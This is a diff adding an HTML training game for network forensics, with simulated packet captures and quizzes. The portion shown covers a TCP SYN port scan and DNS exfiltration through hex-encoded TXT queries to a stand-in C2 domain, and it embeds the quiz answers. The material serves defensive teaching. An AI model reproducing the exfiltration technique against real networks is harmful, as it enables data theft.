@@ -1,0 +1,1858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../components/AchievementManager.js"></script>
+    <script src="../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Forensics Lab - Dark Arts - Hexworth Prime</title>
+    <style>
+        /* ===== ROOT VARIABLES ===== */
+        :root {
+            --bg:         #0a0a0a;
+            --bg2:        #111111;
+            --bg3:        #1a0000;
+            --card:       #160000;
+            --border:     rgba(239, 68, 68, 0.22);
+            --border-hi:  rgba(239, 68, 68, 0.55);
+            --red:        #ef4444;
+            --red-dark:   #dc2626;
+            --red-dim:    rgba(239, 68, 68, 0.12);
+            --red-glow:   rgba(239, 68, 68, 0.08);
+            --green:      #22c55e;
+            --green-dim:  rgba(34, 197, 94, 0.12);
+            --yellow:     #eab308;
+            --blue:       #3b82f6;
+            --orange:     #f97316;
+            --purple:     #a855f7;
+            --text:       #e5e7eb;
+            --muted:      #6b7280;
+            --mono:       'Courier New', Courier, monospace;
+
+            /* Protocol row tints */
+            --tcp-tint:   rgba(34, 197, 94, 0.06);
+            --dns-tint:   rgba(59, 130, 246, 0.06);
+            --http-tint:  rgba(249, 115, 22, 0.06);
+            --tls-tint:   rgba(168, 85, 247, 0.06);
+            --smb-tint:   rgba(239, 68, 68, 0.08);
+            --tcp-badge:  #22c55e;
+            --dns-badge:  #3b82f6;
+            --http-badge: #f97316;
+            --tls-badge:  #a855f7;
+            --smb-badge:  #ef4444;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--mono);
+            min-height: 100vh;
+            background-image: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0,0,0,0.03) 2px,
+                rgba(0,0,0,0.03) 4px
+            );
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            background: rgba(22, 0, 0, 0.92);
+            border-bottom: 1px solid var(--border);
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(8px);
+        }
+
+        .back-link {
+            color: var(--muted);
+            text-decoration: none;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: color 0.2s;
+            white-space: nowrap;
+        }
+        .back-link:hover { color: var(--red); }
+
+        .header-title {
+            font-size: 0.95rem;
+            color: var(--red);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .header-subtitle {
+            font-size: 0.72rem;
+            color: var(--muted);
+            letter-spacing: 0.05em;
+        }
+
+        .header-meta {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .score-display {
+            font-size: 0.82rem;
+            color: var(--text);
+        }
+        .score-display span {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        .progress-pips {
+            display: flex;
+            gap: 5px;
+        }
+        .pip {
+            width: 20px;
+            height: 6px;
+            border-radius: 3px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid var(--border);
+            transition: background 0.3s;
+        }
+        .pip.done    { background: var(--green); border-color: var(--green); }
+        .pip.active  { background: var(--red);   border-color: var(--red); }
+
+        /* ===== MAIN LAYOUT ===== */
+        main {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 24px 20px;
+        }
+
+        /* ===== INVESTIGATION HEADER ===== */
+        .inv-header {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 16px 20px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 20px;
+        }
+
+        .inv-badge {
+            background: var(--red-dim);
+            border: 1px solid var(--border-hi);
+            color: var(--red);
+            font-size: 0.68rem;
+            padding: 3px 8px;
+            border-radius: 3px;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            white-space: nowrap;
+            margin-top: 2px;
+        }
+
+        .inv-info { flex: 1; }
+
+        .inv-title {
+            font-size: 1.05rem;
+            color: var(--text);
+            margin-bottom: 4px;
+            letter-spacing: 0.04em;
+        }
+
+        .inv-brief {
+            font-size: 0.75rem;
+            color: var(--muted);
+            line-height: 1.6;
+        }
+
+        .inv-meta {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+
+        .diff-tag {
+            font-size: 0.68rem;
+            padding: 2px 8px;
+            border-radius: 3px;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+        .diff-easy    { background: rgba(34,197,94,0.12); color: var(--green); border: 1px solid rgba(34,197,94,0.3); }
+        .diff-medium  { background: rgba(234,179,8,0.12);  color: var(--yellow); border: 1px solid rgba(234,179,8,0.3); }
+        .diff-hard    { background: rgba(239,68,68,0.12);  color: var(--red);    border: 1px solid rgba(239,68,68,0.3); }
+
+        .flag-hint {
+            font-size: 0.7rem;
+            color: var(--muted);
+        }
+        .flag-hint kbd {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 3px;
+            padding: 0 4px;
+            font-size: 0.68rem;
+            font-family: var(--mono);
+        }
+
+        /* ===== PACKET TABLE ===== */
+        .packet-table-wrap {
+            background: #0d0d0d;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .table-toolbar {
+            background: rgba(22,0,0,0.7);
+            border-bottom: 1px solid var(--border);
+            padding: 8px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.7rem;
+            color: var(--muted);
+        }
+
+        .toolbar-file {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        .toolbar-sep { color: rgba(255,255,255,0.1); }
+
+        .flag-counter {
+            margin-left: auto;
+            color: var(--yellow);
+        }
+        .flag-counter span { color: var(--text); font-weight: 700; }
+
+        .packet-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.72rem;
+        }
+
+        .packet-table thead tr {
+            background: rgba(255,255,255,0.04);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .packet-table th {
+            padding: 7px 10px;
+            text-align: left;
+            color: var(--muted);
+            font-weight: 400;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            font-size: 0.65rem;
+            cursor: pointer;
+            user-select: none;
+            white-space: nowrap;
+        }
+        .packet-table th:hover { color: var(--text); }
+
+        .packet-table tbody tr {
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        /* Protocol row tints */
+        .packet-table tbody tr.proto-TCP  { background: var(--tcp-tint); }
+        .packet-table tbody tr.proto-DNS  { background: var(--dns-tint); }
+        .packet-table tbody tr.proto-HTTP { background: var(--http-tint); }
+        .packet-table tbody tr.proto-TLS  { background: var(--tls-tint); }
+        .packet-table tbody tr.proto-SMB  { background: var(--smb-tint); }
+        .packet-table tbody tr.proto-RAW  { background: rgba(255,255,255,0.02); }
+
+        .packet-table tbody tr:hover { filter: brightness(1.4); }
+
+        /* Selected row */
+        .packet-table tbody tr.selected { outline: 1px solid rgba(239,68,68,0.4); }
+
+        /* Flagged row */
+        .packet-table tbody tr.flagged {
+            background: rgba(239, 68, 68, 0.14) !important;
+            outline: 1px solid rgba(239, 68, 68, 0.5);
+        }
+        .packet-table tbody tr.flagged td:first-child::before {
+            content: '! ';
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        .packet-table td {
+            padding: 6px 10px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 200px;
+        }
+
+        .packet-table td.col-no   { color: var(--muted); width: 40px; max-width: 40px; }
+        .packet-table td.col-time { color: var(--muted); width: 90px; }
+        .packet-table td.col-src, .packet-table td.col-dst { font-family: var(--mono); width: 130px; }
+        .packet-table td.col-len  { color: var(--muted); width: 50px; text-align: right; }
+        .packet-table td.col-info { color: #b0b8c8; max-width: 300px; font-size: 0.7rem; }
+
+        .proto-badge {
+            display: inline-block;
+            padding: 1px 6px;
+            border-radius: 2px;
+            font-size: 0.62rem;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+        }
+        .badge-TCP  { background: rgba(34,197,94,0.18);  color: #22c55e; }
+        .badge-DNS  { background: rgba(59,130,246,0.18); color: #3b82f6; }
+        .badge-HTTP { background: rgba(249,115,22,0.18); color: #f97316; }
+        .badge-TLS  { background: rgba(168,85,247,0.18); color: #a855f7; }
+        .badge-SMB  { background: rgba(239,68,68,0.18);  color: #ef4444; }
+        .badge-RAW  { background: rgba(156,163,175,0.18);color: #9ca3af; }
+        .badge-ICMP { background: rgba(234,179,8,0.18);  color: #eab308; }
+
+        .flag-btn {
+            background: none;
+            border: 1px solid rgba(239,68,68,0.3);
+            color: var(--muted);
+            font-size: 0.62rem;
+            padding: 1px 6px;
+            border-radius: 2px;
+            cursor: pointer;
+            font-family: var(--mono);
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .flag-btn:hover, .flag-btn.active {
+            background: var(--red-dim);
+            color: var(--red);
+            border-color: var(--red);
+        }
+
+        /* ===== DETAIL PANEL ===== */
+        .detail-panel {
+            background: #0d0d0d;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+
+        .detail-tabs {
+            display: flex;
+            border-bottom: 1px solid var(--border);
+            background: rgba(22,0,0,0.5);
+        }
+
+        .detail-tab {
+            padding: 8px 16px;
+            font-size: 0.7rem;
+            color: var(--muted);
+            cursor: pointer;
+            border-right: 1px solid var(--border);
+            transition: all 0.2s;
+            user-select: none;
+        }
+        .detail-tab:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+        .detail-tab.active { color: var(--red); background: var(--red-glow); }
+
+        .detail-body {
+            padding: 14px 16px;
+            font-size: 0.72rem;
+            line-height: 1.8;
+            min-height: 80px;
+            color: #b0b8c8;
+        }
+
+        .detail-empty {
+            color: var(--muted);
+            font-style: italic;
+            font-size: 0.72rem;
+        }
+
+        .detail-field {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 2px;
+        }
+        .detail-key {
+            color: var(--muted);
+            min-width: 160px;
+            font-size: 0.7rem;
+        }
+        .detail-val {
+            color: var(--text);
+            word-break: break-all;
+        }
+        .detail-val.suspicious { color: var(--red); font-weight: 700; }
+        .detail-val.good       { color: var(--green); }
+        .detail-val.warn       { color: var(--yellow); }
+
+        .hex-view {
+            font-size: 0.65rem;
+            line-height: 1.9;
+            color: #6b7280;
+        }
+        .hex-view .hex-offset { color: #374151; min-width: 70px; display: inline-block; }
+        .hex-view .hex-bytes  { color: #4b5563; min-width: 200px; display: inline-block; }
+        .hex-view .hex-ascii  { color: #6b7280; }
+        .hex-view .hex-highlight { color: var(--red); }
+
+        /* ===== ANALYSIS PANEL ===== */
+        .analysis-panel {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .analysis-title {
+            font-size: 0.8rem;
+            color: var(--red);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .question-block {
+            margin-bottom: 20px;
+            padding: 14px;
+            background: rgba(0,0,0,0.25);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 4px;
+        }
+
+        .question-text {
+            font-size: 0.8rem;
+            color: var(--text);
+            margin-bottom: 12px;
+            line-height: 1.6;
+        }
+
+        .question-num {
+            color: var(--red);
+            font-weight: 700;
+        }
+
+        .mc-options {
+            display: flex;
+            flex-direction: column;
+            gap: 7px;
+        }
+
+        .mc-option {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 8px 12px;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.76rem;
+            color: var(--text);
+            background: rgba(255,255,255,0.02);
+            user-select: none;
+        }
+        .mc-option:hover { border-color: rgba(239,68,68,0.3); background: var(--red-glow); }
+        .mc-option.selected { border-color: var(--red); background: var(--red-dim); }
+        .mc-option.correct  { border-color: var(--green) !important; background: var(--green-dim) !important; color: var(--green); }
+        .mc-option.incorrect{ border-color: #7f1d1d !important; background: rgba(127,29,29,0.2) !important; color: #f87171; }
+
+        .mc-letter {
+            font-size: 0.68rem;
+            color: var(--muted);
+            min-width: 16px;
+            margin-top: 1px;
+        }
+
+        .question-feedback {
+            margin-top: 8px;
+            font-size: 0.72rem;
+            color: var(--muted);
+            padding: 6px 10px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 3px;
+            display: none;
+            line-height: 1.6;
+        }
+        .question-feedback.visible { display: block; }
+        .question-feedback.ok  { color: var(--green); }
+        .question-feedback.bad { color: #f87171; }
+
+        /* ===== SUBMIT BAR ===== */
+        .submit-bar {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid var(--border);
+            flex-wrap: wrap;
+        }
+
+        .submit-status {
+            font-size: 0.72rem;
+            color: var(--muted);
+            flex: 1;
+        }
+
+        .btn {
+            padding: 9px 22px;
+            border-radius: 4px;
+            font-family: var(--mono);
+            font-size: 0.78rem;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            letter-spacing: 0.05em;
+            font-weight: 700;
+        }
+
+        .btn-primary {
+            background: var(--red-dark);
+            color: #fff;
+            border: 1px solid var(--red);
+        }
+        .btn-primary:hover { background: var(--red); box-shadow: 0 0 12px rgba(239,68,68,0.3); }
+        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--muted);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .btn-ghost:hover { color: var(--text); border-color: rgba(255,255,255,0.25); }
+
+        /* ===== TIMELINE ZONE (Inv 5) ===== */
+        .timeline-section {
+            margin-top: 20px;
+        }
+
+        .timeline-title {
+            font-size: 0.76rem;
+            color: var(--yellow);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-bottom: 12px;
+        }
+
+        .timeline-phases {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        @media (max-width: 700px) { .timeline-phases { grid-template-columns: 1fr 1fr; } }
+
+        .phase-zone {
+            background: rgba(0,0,0,0.3);
+            border: 2px dashed rgba(255,255,255,0.1);
+            border-radius: 5px;
+            padding: 10px;
+            min-height: 100px;
+            transition: border-color 0.2s, background 0.2s;
+        }
+        .phase-zone.drag-over { border-color: var(--yellow); background: rgba(234,179,8,0.06); }
+        .phase-zone.correct   { border-color: var(--green); border-style: solid; }
+        .phase-zone.incorrect { border-color: var(--red);   border-style: solid; }
+
+        .phase-label {
+            font-size: 0.65rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .phase-drop-area {
+            min-height: 60px;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .flagged-pool {
+            background: rgba(0,0,0,0.2);
+            border: 1px solid var(--border);
+            border-radius: 5px;
+            padding: 10px;
+            min-height: 60px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+
+        .draggable-chip {
+            background: rgba(239,68,68,0.15);
+            border: 1px solid rgba(239,68,68,0.4);
+            border-radius: 3px;
+            padding: 4px 8px;
+            font-size: 0.65rem;
+            color: var(--red);
+            cursor: grab;
+            user-select: none;
+            transition: opacity 0.2s;
+            white-space: nowrap;
+        }
+        .draggable-chip:active { cursor: grabbing; opacity: 0.6; }
+        .draggable-chip.in-phase { background: rgba(59,130,246,0.15); border-color: rgba(59,130,246,0.4); color: #60a5fa; }
+
+        /* ===== SCORE RESULT ===== */
+        #result-screen {
+            display: none;
+            background: var(--card);
+            border: 1px solid var(--border-hi);
+            border-radius: 6px;
+            padding: 36px 28px;
+            text-align: center;
+        }
+
+        .result-rank {
+            font-size: 1.4rem;
+            color: var(--red);
+            letter-spacing: 0.08em;
+            margin-bottom: 8px;
+        }
+
+        .result-score {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 4px;
+        }
+
+        .result-max {
+            font-size: 0.8rem;
+            color: var(--muted);
+            margin-bottom: 20px;
+        }
+
+        .result-bar-wrap {
+            background: rgba(255,255,255,0.06);
+            border-radius: 4px;
+            height: 8px;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto 24px;
+            overflow: hidden;
+        }
+        .result-bar {
+            height: 100%;
+            border-radius: 4px;
+            background: var(--red);
+            width: 0;
+            transition: width 1.2s cubic-bezier(.22,.61,.36,1);
+        }
+
+        .result-xp {
+            font-size: 0.82rem;
+            color: var(--yellow);
+            margin-bottom: 16px;
+        }
+
+        .result-breakdown {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            font-size: 0.72rem;
+            color: var(--muted);
+            margin-bottom: 24px;
+        }
+        .result-breakdown .stat-val { color: var(--text); font-weight: 700; display: block; font-size: 1rem; }
+
+        /* ===== SCROLLBAR ===== */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
+        ::-webkit-scrollbar-thumb { background: rgba(239,68,68,0.3); border-radius: 3px; }
+
+        /* ===== UTILITY ===== */
+        .hidden { display: none !important; }
+
+        .section-divider {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 20px 0;
+        }
+
+        .info-box {
+            background: rgba(59,130,246,0.06);
+            border: 1px solid rgba(59,130,246,0.2);
+            border-radius: 4px;
+            padding: 10px 14px;
+            font-size: 0.72rem;
+            color: #93c5fd;
+            margin-bottom: 14px;
+            line-height: 1.7;
+        }
+
+        .warn-box {
+            background: rgba(234,179,8,0.06);
+            border: 1px solid rgba(234,179,8,0.2);
+            border-radius: 4px;
+            padding: 10px 14px;
+            font-size: 0.72rem;
+            color: var(--yellow);
+            margin-bottom: 14px;
+            line-height: 1.7;
+        }
+
+        .flagging-tip {
+            font-size: 0.68rem;
+            color: var(--muted);
+            text-align: center;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <a class="back-link" onclick="window.history.back()">← Back</a>
+    <div>
+        <div class="header-title">Network Forensics Lab</div>
+        <div class="header-subtitle">Dark Arts · Packet Analysis</div>
+    </div>
+    <div class="header-meta">
+        <div class="score-display">Score: <span id="hdr-score">0</span></div>
+        <div class="progress-pips" id="pips"></div>
+    </div>
+</header>
+
+<main>
+    <!-- INVESTIGATIONS (shown one at a time) -->
+    <div id="inv-container"></div>
+
+    <!-- RESULT SCREEN -->
+    <div id="result-screen">
+        <div id="result-rank" class="result-rank"></div>
+        <div id="result-score" class="result-score"></div>
+        <div id="result-max"  class="result-max"></div>
+        <div class="result-bar-wrap"><div class="result-bar" id="result-bar"></div></div>
+        <div class="result-xp">+100 XP awarded</div>
+        <div class="result-breakdown" id="result-breakdown"></div>
+        <button class="btn btn-ghost" onclick="restartGame()">Restart</button>
+    </div>
+</main>
+
+<script>
+/* ============================================================
+   DATA: 5 Investigations — packet sets, questions, answers
+   ============================================================ */
+
+const INVESTIGATIONS = [
+
+    /* ------------------------------------------------------------------ */
+    /* INV 1: TCP Handshake Analysis (Easy)                                */
+    /* ------------------------------------------------------------------ */
+    {
+        id: 1,
+        title: 'TCP Handshake Analysis',
+        brief: 'A PCAP was captured on the network edge sensor. Examine the TCP sessions below. ' +
+               'A normal service connection is present alongside suspicious scanning activity. ' +
+               'Flag the packets that indicate malicious behavior.',
+        difficulty: 'easy',
+        pcapFile: 'capture_20241108_edge01.pcap',
+        flagTargets: [5, 6, 7, 8, 9, 10],  // packet indices (0-based) that are malicious
+        flagHint: 'Flag packets involved in the port scan',
+        packets: [
+            { src:'192.168.1.100', dst:'10.0.0.5',       proto:'TCP',  len:74,  time:'0.000000', info:'49152 → 80 [SYN] Seq=0 Win=64240 Len=0' },
+            { src:'10.0.0.5',      dst:'192.168.1.100',  proto:'TCP',  len:74,  time:'0.000312', info:'80 → 49152 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0' },
+            { src:'192.168.1.100', dst:'10.0.0.5',       proto:'TCP',  len:66,  time:'0.000598', info:'49152 → 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0' },
+            { src:'192.168.1.100', dst:'10.0.0.5',       proto:'HTTP', len:491, time:'0.001240', info:'GET /index.html HTTP/1.1' },
+            { src:'10.0.0.5',      dst:'192.168.1.100',  proto:'HTTP', len:892, time:'0.002890', info:'HTTP/1.1 200 OK (text/html)' },
+            /* SYN scan starts here */
+            { src:'192.168.1.200', dst:'10.0.0.5',       proto:'TCP',  len:58,  time:'0.100000', info:'54321 → 22 [SYN] Seq=0 Win=1024 Len=0 MSS=1460' },
+            { src:'10.0.0.5',      dst:'192.168.1.200',  proto:'TCP',  len:58,  time:'0.100120', info:'22 → 54321 [RST, ACK] Seq=0 Ack=1 Win=0 Len=0' },
+            { src:'192.168.1.200', dst:'10.0.0.5',       proto:'TCP',  len:58,  time:'0.100400', info:'54322 → 21 [SYN] Seq=0 Win=1024 Len=0 MSS=1460' },
+            { src:'10.0.0.5',      dst:'192.168.1.200',  proto:'TCP',  len:58,  time:'0.100510', info:'21 → 54322 [RST, ACK] Seq=0 Ack=1 Win=0 Len=0' },
+            { src:'192.168.1.200', dst:'10.0.0.5',       proto:'TCP',  len:58,  time:'0.100700', info:'54323 → 443 [SYN] Seq=0 Win=1024 Len=0 MSS=1460' },
+            { src:'10.0.0.5',      dst:'192.168.1.200',  proto:'TCP',  len:74,  time:'0.100820', info:'443 → 54323 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0' },
+        ],
+        /* Detail data for expand panel — keyed by packet index */
+        details: {
+            0: { frame:'Frame 1', ethType:'IPv4', ttl:'64', flags:'0x002 (SYN)', window:'64240', options:'MSS=1460, SACK permitted, Timestamps' },
+            1: { frame:'Frame 2', ethType:'IPv4', ttl:'64', flags:'0x012 (SYN, ACK)', window:'65535', options:'MSS=1460, SACK permitted' },
+            2: { frame:'Frame 3', ethType:'IPv4', ttl:'64', flags:'0x010 (ACK)', window:'64240', options:'Timestamps' },
+            5: { frame:'Frame 6', ethType:'IPv4', ttl:'128', flags:'0x002 (SYN)', window:'1024', options:'MSS=1460', note:'SUSPICIOUS: Small window size typical of scan tools (nmap default). SYN to port 22.' },
+            6: { frame:'Frame 7', ethType:'IPv4', ttl:'64', flags:'0x014 (RST, ACK)', window:'0', options:'', note:'Port 22 is CLOSED — RST response.' },
+            7: { frame:'Frame 8', ethType:'IPv4', ttl:'128', flags:'0x002 (SYN)', window:'1024', options:'MSS=1460', note:'SUSPICIOUS: SYN to port 21 (FTP). Same scanning host.' },
+            8: { frame:'Frame 9', ethType:'IPv4', ttl:'64', flags:'0x014 (RST, ACK)', window:'0', options:'', note:'Port 21 is CLOSED.' },
+            9: { frame:'Frame 10', ethType:'IPv4', ttl:'128', flags:'0x002 (SYN)', window:'1024', options:'MSS=1460', note:'SUSPICIOUS: SYN to port 443 (HTTPS).' },
+            10: { frame:'Frame 11', ethType:'IPv4', ttl:'64', flags:'0x012 (SYN, ACK)', window:'65535', options:'MSS=1460', note:'OPEN PORT: Port 443 responded with SYN-ACK.' },
+        },
+        questions: [
+            {
+                q: 'What type of scan is being performed by 192.168.1.200?',
+                options: ['UDP scan', 'TCP SYN (Stealth) scan', 'TCP Connect scan', 'FIN scan'],
+                correct: 1,
+                feedback: 'Correct. This is a TCP SYN scan (also called a stealth or half-open scan). The scanner sends SYN packets but never completes the 3-way handshake. Open ports reply with SYN-ACK; closed ports reply with RST. This avoids creating a full connection log on many systems.'
+            },
+            {
+                q: 'How many destination ports did the scanner probe in this capture?',
+                options: ['2 ports', '3 ports', '5 ports', '1 port'],
+                correct: 1,
+                feedback: 'Correct. Three ports were probed: 22 (SSH), 21 (FTP), and 443 (HTTPS).'
+            },
+            {
+                q: 'Which port responded with SYN-ACK, indicating it is OPEN?',
+                options: ['Port 22', 'Port 21', 'Port 443', 'Port 80'],
+                correct: 2,
+                feedback: 'Correct. Port 443 replied with SYN-ACK (Frame 11), meaning HTTPS is running and accepting connections.'
+            },
+        ]
+    },
+
+    /* ------------------------------------------------------------------ */
+    /* INV 2: DNS Exfiltration (Easy-Medium)                               */
+    /* ------------------------------------------------------------------ */
+    {
+        id: 2,
+        title: 'DNS Exfiltration',
+        brief: 'A data loss prevention sensor triggered on repeated DNS queries from a workstation. ' +
+               'Examine the DNS traffic below. Some queries appear legitimate; others may be used ' +
+               'to tunnel data out of the network by encoding it in subdomain labels.',
+        difficulty: 'medium',
+        pcapFile: 'capture_20241109_dlp_sensor.pcap',
+        flagTargets: [4, 5, 6, 8, 10, 12],
+        flagHint: 'Flag queries with suspiciously encoded or unusually long subdomains',
+        packets: [
+            { src:'192.168.1.55',  dst:'8.8.8.8',        proto:'DNS',  len:85,  time:'0.000000', info:'Standard query A google.com' },
+            { src:'8.8.8.8',       dst:'192.168.1.55',   proto:'DNS',  len:101, time:'0.012400', info:'Standard query response A 142.250.80.46' },
+            { src:'192.168.1.55',  dst:'8.8.8.8',        proto:'DNS',  len:97,  time:'0.025000', info:'Standard query A api.github.com' },
+            { src:'8.8.8.8',       dst:'192.168.1.55',   proto:'DNS',  len:113, time:'0.038200', info:'Standard query response A 140.82.112.3' },
+            /* Exfil queries start */
+            { src:'192.168.1.55',  dst:'192.168.1.1',    proto:'DNS',  len:164, time:'1.200000', info:'Standard query TXT 5a4d617474686577734163636f756e74.exfil-c2.net' },
+            { src:'192.168.1.1',   dst:'192.168.1.55',   proto:'DNS',  len:85,  time:'1.213200', info:'Standard query response TXT "ACK 1"' },
+            { src:'192.168.1.55',  dst:'192.168.1.1',    proto:'DNS',  len:160, time:'1.230000', info:'Standard query TXT 506173737764526f6f74546f6b656e21.exfil-c2.net' },
+            { src:'8.8.8.8',       dst:'192.168.1.55',   proto:'DNS',  len:113, time:'1.250000', info:'Standard query response A 140.82.112.5' },
+            { src:'192.168.1.55',  dst:'192.168.1.1',    proto:'DNS',  len:168, info:'Standard query TXT 4e6574776f726b53636865646d61703031.exfil-c2.net', time:'1.270000' },
+            { src:'192.168.1.1',   dst:'192.168.1.55',   proto:'DNS',  len:85,  time:'1.283000', info:'Standard query response TXT "ACK 3"' },
+            { src:'192.168.1.55',  dst:'192.168.1.1',    proto:'DNS',  len:157, time:'1.300000', info:'Standard query TXT 416464726573733a3139322e3136382e.exfil-c2.net' },
+            { src:'192.168.1.55',  dst:'8.8.8.8',        proto:'DNS',  len:90,  time:'1.320000', info:'Standard query A updates.microsoft.com' },
+            { src:'192.168.1.55',  dst:'192.168.1.1',    proto:'DNS',  len:171, time:'1.340000', info:'Standard query TXT 312e302f32342e5374616765436f6d70.exfil-c2.net' },
+            { src:'192.168.1.1',   dst:'192.168.1.55',   proto:'DNS',  len:85,  time:'1.353000', info:'Standard query response TXT "ACK 5"' },
+            { src:'192.168.1.55',  dst:'8.8.8.8',        proto:'DNS',  len:94,  time:'1.370000', info:'Standard query A cdn.cloudflare.com' },
+        ],
+        details: {
+            4: { queryName:'5a4d617474686577734163636f756e74.exfil-c2.net', qtype:'TXT', decoded:'ZMatthewsAccount (hex decoded)', ttl:'0 (suspicious — no caching)', note:'SUSPICIOUS: Hex-encoded data in subdomain label. 32-char hex string = 16 bytes decoded.' },
+            5: { queryName:'response', qtype:'TXT', rdata:'"ACK 1"', note:'C2 server acknowledging receipt of chunk 1.' },
+            6: { queryName:'506173737764526f6f74546f6b656e21.exfil-c2.net', qtype:'TXT', decoded:'PasswdRootToken! (hex decoded)', ttl:'0', note:'CRITICAL: Decoded value contains credential material.' },
+            8: { queryName:'4e6574776f726b53636865646d61703031.exfil-c2.net', qtype:'TXT', decoded:'NetworkSchedmap01 (hex decoded)', ttl:'0', note:'SUSPICIOUS: Hex-encoded sensitive hostname data.' },
+            10: { queryName:'416464726573733a3139322e3136382e.exfil-c2.net', qtype:'TXT', decoded:'Address:192.168. (hex decoded, truncated)', ttl:'0', note:'SUSPICIOUS: Internal network addresses being exfiltrated.' },
+            12: { queryName:'312e302f32342e5374616765436f6d70.exfil-c2.net', qtype:'TXT', decoded:'1.0/24.StageComp (hex decoded)', ttl:'0', note:'SUSPICIOUS: Subnet and host information exfiltration continues.' },
+        },
+        questions: [
+            {
+                q: 'What encoding method is used to hide data in the DNS queries?',
+                options: ['Base64 encoding', 'Hexadecimal (hex) encoding', 'URL encoding', 'ROT13 encoding'],
+                correct: 1,
+                feedback: 'Correct. The subdomain labels consist of hexadecimal-encoded data. Hex encoding doubles the byte size but uses only alphanumeric characters that are valid in DNS labels, making it a common choice for DNS exfiltration.'
+            },
+            {
+                q: 'What query type is used for exfiltration in this capture?',
+                options: ['A (IPv4 address)', 'MX (mail exchange)', 'TXT (text record)', 'CNAME (canonical name)'],
+                correct: 2,
+                feedback: 'Correct. TXT queries are used because TXT records can carry arbitrary text data up to 255 bytes per string and are rarely blocked by DNS resolvers or firewalls. DNS exfiltration tools like dnscat2 and iodine frequently leverage TXT records.'
+            },
+            {
+                q: 'What is the exfiltration domain (C2 DNS server)?',
+                options: ['google.com', '8.8.8.8', 'updates.microsoft.com', 'exfil-c2.net'],
+                correct: 3,
